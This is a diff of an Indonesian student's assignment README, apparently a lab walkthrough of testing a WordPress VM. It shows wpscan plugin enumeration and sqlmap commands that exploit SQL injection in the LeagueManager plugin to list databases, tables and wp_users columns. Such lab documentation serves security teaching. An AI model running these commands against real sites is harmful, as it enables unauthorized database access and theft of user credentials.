@@ -193,17 +193,31 @@ ___
  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/wpscan2.JPG "User Password")
 
  3. Menemukan vulnerable plugin dengan mengetikkan perintah wpscan -u 192.168.56.102 -e -vp
-
  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/wpscan3.JPG "LeagueManager")
- ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/wpscan3.JPG "VideoPlayer")
+ ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/wpscan4.JPG "VideoPlayer")
 
 * ### PENGUJIAN DENGAN SQLmap 
- 1. Untuk mengetahui parameter yang vunerable dengan perintah, sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --level 5 --risk 3 --dbms mysql 
+ 1. Untuk mengetahui parameter yang vunerable dan tipe database server dengan perintah, sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --dbs 
 
   ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/vulnrable%20param.JPG "Vunerable Parameter") 
 
- 1. Untuk menampilkan, sqlmap --url="http://192.168.56.102/?match=1" --level 5 --risk 3 --dbms mysql 
-  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/vulnrable%20param.JPG "Vunerable Parameter") 
+ 2. Untuk menampilkan list nama database yang ada sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --dbs
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap13.JPG "Command list database")
+
+Hasilnya
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap14.JPG "database list") 
+
+ 3. Untuk menampilkan list table dari database wordpress sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --dbms mysql -D wordpress --tables
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap5.JPG "Command table list") 
+
+Hasilnya
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap3.JPG "Table list") 
+
+ 4. Untuk menampilkan list Kolom dari table wp_users sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --dbms mysql -D wordpress -T wp_users --columns
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap11.JPG "Command Column list") 
+
+Hasilnya
+  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap12.JPG "Coulmn list") 
 
 
 
